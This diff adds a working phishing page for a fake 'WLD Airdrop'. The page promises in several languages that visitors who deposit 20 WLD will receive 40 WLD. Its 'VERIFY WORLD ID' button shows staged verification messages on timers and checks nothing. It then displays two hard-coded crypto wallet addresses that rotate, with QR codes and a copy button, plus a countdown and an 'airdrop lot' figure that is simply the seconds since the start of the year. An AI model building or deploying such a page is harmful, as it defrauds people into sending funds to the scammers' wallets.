@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <title>WLD Airdrop</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -15,17 +16,18 @@ html,body{
   overflow:hidden;
 }
 
+/* ===== SCREEN ===== */
 .screen{
   position:absolute;
   inset:0;
 }
 
+/* ===== TEXTOS PRINCIPALES ===== */
 .top-text{
   position:absolute;
   top:8%;
   width:100%;
   height:40%;
-  pointer-events:none;
   z-index:2;
   display:flex;
   align-items:center;
@@ -41,7 +43,7 @@ html,body{
 .main-line{
   font-size:32px;
   font-weight:800;
-  letter-spacing:3px;
+  letter-spacing:2px;
   text-align:center;
   min-height:40px;
 }
@@ -51,15 +53,15 @@ html,body{
   opacity:0;
   transform:scale(1.8);
   filter:blur(4px);
-  transition:opacity 0.4s ease, transform 0.4s ease, filter 0.4s ease;
+  transition:.4s;
 }
-
 .char.visible{
   opacity:1;
   transform:scale(1);
   filter:blur(0);
 }
 
+/* ===== BOTÓN ===== */
 .bottom-center{
   position:absolute;
   top:55%;
@@ -75,10 +77,7 @@ html,body{
   width:90px;
   animation:spin 20s linear infinite;
 }
-@keyframes spin{
-  from{transform:rotateY(0)}
-  to{transform:rotateY(360deg)}
-}
+@keyframes spin{to{transform:rotateY(360deg)}}
 
 #verifyBtn{
   padding:14px 34px;
@@ -92,39 +91,114 @@ html,body{
   height:50px;
 }
 
+/* ===== FONDO ===== */
 .bg-layer{
   position:absolute;
   inset:0;
-  pointer-events:none;
   overflow:hidden;
   z-index:1;
   opacity:.45;
   filter:blur(5px);
 }
-
 .bg-text{
   position:absolute;
   white-space:nowrap;
   font-weight:800;
-  color:#000;
   animation:floatText linear infinite;
 }
-
 @keyframes floatText{
   0%{opacity:0;transform:translateX(var(--from))}
   20%{opacity:var(--op)}
   40%{opacity:var(--op)}
   100%{opacity:0;transform:translateX(var(--to))}
 }
+
+/* ===== MODAL ===== */
+#modalBox{
+  display:none;
+  position:fixed;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  background:#fff;
+  padding:32px 40px;
+  border-radius:16px;
+  box-shadow:0 20px 50px rgba(0,0,0,.25);
+  z-index:99;
+  font-size:22px;
+  font-weight:800;
+}
+
+/* ===== SCREEN 2 ===== */
+#screen2{
+  display:none;
+  position:absolute;
+  inset:0;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:18px;
+}
+
+.static-text{
+  font-size:28px;
+  font-weight:900;
+  color:#000;
+  letter-spacing:3px;
+}
+
+/* CONTADOR DESTACADO */
+#dateCountdown{
+  font-size:48px;
+  font-weight:900;
+  letter-spacing:4px;
+}
+
+/* QR STYLES */
+.qr-box canvas{
+  background:#fff;
+  padding:12px;
+  border-radius:14px;
+}
+
+.deposit-code input{
+  width:320px;
+  padding:10px;
+  text-align:center;
+}
+.deposit-code button{
+  margin-top:10px;
+  padding:10px 22px;
+  border:none;
+  background:#000;
+  color:#fff;
+}
+
+#airdropLot{
+  margin-top:14px;
+  font-size:18px;
+  font-weight:800;
+  letter-spacing:2px;
+}
+
+/* ===== RESPONSIVE ===== */
+@media(max-width:600px){
+  .main-line{font-size:20px}
+  .logo{width:70px}
+  #verifyBtn{min-width:200px;height:45px;font-size:14px}
+  #dateCountdown{font-size:36px}
+  .deposit-code input{width:260px}
+  .static-text{font-size:24px}
+}
 </style>
 </head>
 
 <body>
 
-<div class="screen">
-
+<!-- SCREEN 1 -->
+<div class="screen" id="screen1">
   <div class="bg-layer" id="bgLayer"></div>
-
   <div class="top-text">
     <div class="text-group">
       <div class="main-line" id="l1"></div>
@@ -132,102 +206,141 @@ html,body{
       <div class="main-line" id="l3"></div>
     </div>
   </div>
-
   <div class="bottom-center">
-    <img src="logowld.png" class="logo" alt="WLD">
+    <img src="logowld.png" class="logo">
     <button id="verifyBtn">VERIFY WORLD ID</button>
   </div>
+</div>
 
+<!-- MODAL -->
+<div id="modalBox"><span id="modalText">VERIFICANDO...</span></div>
+
+<!-- SCREEN 2 -->
+<div class="screen" id="screen2" style="display: none;">
+  <div class="static-text">AIRDROP END</div>
+
+
+  <div id="dateCountdown"></div>
+
+  <div class="qr-box">
+    <canvas id="qrCanvas" width="160" height="160"></canvas>
+  </div>
+
+  <div class="deposit-code">
+    <input id="addr" readonly>
+    <button id="copyBtn">COPY ADDRESS</button>
+  </div>
+
+  <div id="airdropLot">
+    AIRDROP LOT: <span id="lotValue">0</span>
+  </div>
 </div>
 
 <script>
-const TEXTS = [
-  "100% EARN AIRDROP","DEPOSIT UP TO 20 WLD","GET 40 WLD",
-  "100% 获得空投","存入最多 20 WLD","获得 40 WLD",
-  "100% GANA AIRDROP","DEPOSITA HASTA 20 WLD","RECIBE 40 WLD",
-  "100% GANHE AIRDROP","DEPOSITE ATÉ 20 WLD","RECEBA 40 WLD",
-  "100% OTTIENI AIRDROP","DEPOSITA FINO A 20 WLD","OTTENERE 40 WLD"
+
+/* ===== SCREEN 1 TEXTOS ===== */
+const TEXTS1=[
+"100% EARN AIRDROP","DEPOSIT 20 WLD","GET 40 WLD",
+"100% 获得空投","存入 20 WLD","获得 40 WLD"
 ];
 
-const lines = [
-  document.getElementById("l1"),
-  document.getElementById("l2"),
-  document.getElementById("l3")
-];
+const lines=[l1,l2,l3];
+let idx1=0;
 
-let idx = 0;
-let isTyping = false;
-
-async function typeWithScaleEffect(element, text, speed = 40) {
-  element.innerHTML = "";
-  for (let i = 0; i < text.length; i++) {
-    const span = document.createElement("span");
-    span.className = "char";
-    span.innerHTML = text[i] === " " ? "&nbsp;" : text[i];
-    element.appendChild(span);
-
-    void span.offsetWidth;
-    setTimeout(() => {
-      span.classList.add("visible");
-    }, 10);
-
-    await new Promise(r => setTimeout(r, speed));
+async function type1(el,text){
+  el.innerHTML="";
+  for(const c of text){
+    const s=document.createElement("span");
+    s.className="char";
+    s.innerHTML=c===" "?"&nbsp;":c;
+    el.appendChild(s);
+    s.classList.add("visible");
+    await new Promise(r=>setTimeout(r,40));
   }
 }
 
-async function showGroup() {
-  if (isTyping) return;
-  isTyping = true;
-
-  lines.forEach(line => line.innerHTML = "");
-
-  await new Promise(r => setTimeout(r, 400));
-
-  for (let i = 0; i < 3; i++) {
-    const text = TEXTS[(idx + i) % TEXTS.length];
-    await typeWithScaleEffect(lines[i], text);
-    await new Promise(r => setTimeout(r, 150));
-  }
-
-  idx = (idx + 3) % TEXTS.length;
-  await new Promise(r => setTimeout(r, 3000));
-  isTyping = false;
+async function loop1(){
+  for(let i=0;i<3;i++) await type1(lines[i],TEXTS1[(idx1+i)%TEXTS1.length]);
+  idx1=(idx1+3)%TEXTS1.length;
+  setTimeout(()=>lines.forEach(l=>l.innerHTML=""),3000);
 }
 
-showGroup();
-setInterval(showGroup, 7000);
+loop1(); setInterval(loop1,7000);
 
-/* ===== BACKGROUND FLOATING TEXT ===== */
-const bgLayer = document.getElementById("bgLayer");
-let bgCount = 0;
-const MAX_BG = 9;
-
-function spawnBgText() {
-  if (bgCount >= MAX_BG) return;
-
-  const t = document.createElement("div");
-  t.className = "bg-text";
-  t.textContent = TEXTS[Math.floor(Math.random() * TEXTS.length)];
-  t.style.fontSize = (Math.random() * 36 + 42) + "px"; // ⇐ aumentamos el mínimo a 42px
-  t.style.top = (Math.random() * 85) + "%";
-
-  const d = Math.random() > 0.5;
-  t.style.setProperty("--from", d ? "-120%" : "120%");
-  t.style.setProperty("--to", d ? "120%" : "-120%");
-  t.style.setProperty("--op", (Math.random() * 0.15 + 0.2).toFixed(2));
-  t.style.animationDuration = (Math.random() * 20 + 28) + "s";
-
+/* ===== SCREEN 1 FONDO ===== */
+function spawnBg(){
+  const t=document.createElement("div");
+  t.className="bg-text";
+  t.textContent=TEXTS1[Math.random()*TEXTS1.length|0];
+  t.style.fontSize=(Math.random()*36+42)+"px";
+  t.style.top=Math.random()*85+"%";
+  const d=Math.random()>.5;
+  t.style.setProperty("--from",d?"-120%":"120%");
+  t.style.setProperty("--to",d?"120%":"-120%");
+  t.style.setProperty("--op",(Math.random()*.15+.2).toFixed(2));
+  t.style.animationDuration=(Math.random()*20+28)+"s";
   bgLayer.appendChild(t);
-  bgCount++;
-
-  setTimeout(() => {
-    t.remove();
-    bgCount--;
-  }, 50000);
+  setTimeout(()=>t.remove(),50000);
 }
 
-for (let i = 0; i < 5; i++) spawnBgText();
-setInterval(spawnBgText, 2600);
+setInterval(spawnBg,2600);
+
+/* ===== VERIFY FLOW ===== */
+verifyBtn.onclick=()=>{
+  modalBox.style.display="block";
+  modalText.style.color="#000";
+  modalText.innerText="VERIFICANDO...";
+  setTimeout(()=>{
+    modalText.style.color="green";
+    modalText.innerText="WORLD ID VERIFICADO";
+    setTimeout(()=>{
+      modalBox.style.display="none";
+      screen1.style.display="none";
+      screen2.style.display="flex";
+      startTimer();
+      startQR();
+    },2000);
+  },4000);
+};
+
+/* ===== screen2 COUNTDOWN ===== */
+const dateEl=document.getElementById("dateCountdown");
+function startTimer(){
+  setInterval(()=>{
+    const now=new Date();
+    const diff=new Date("2026-01-11T00:00:00")-now;
+    const h=Math.floor(diff/36e5)%24;
+    const m=Math.floor(diff/6e4)%60;
+    const s=Math.floor(diff/1e3)%60;
+    dateEl.innerText=`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  },1000);
+
+  /* ===== AIRDROP LOT estático ===== */
+  const startYear=new Date(new Date().getFullYear(),0,1);
+  const secondsSince=Math.floor((Date.now()-startYear.getTime())/1000);
+  lotValue.innerText=secondsSince.toLocaleString();
+}
+
+/* ===== QR ===== */
+const WALLETS=[
+"0x1f62e7890d5db2c94c280547876b050f5d1816c5",
+"0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
+];
+let wi=0;
+const qr=new QRious({element:qrCanvas,size:160,value:WALLETS[0]});
+addr.value=WALLETS[0];
+
+function startQR(){
+  setInterval(()=>{
+    wi=(wi+1)%WALLETS.length;
+    qr.set({value:WALLETS[wi]});
+    addr.value=WALLETS[wi];
+  },20000);
+}
+
+/* ===== COPY ===== */
+copyBtn.onclick=()=>navigator.clipboard.writeText(addr.value);
+
 </script>
 
 </body>
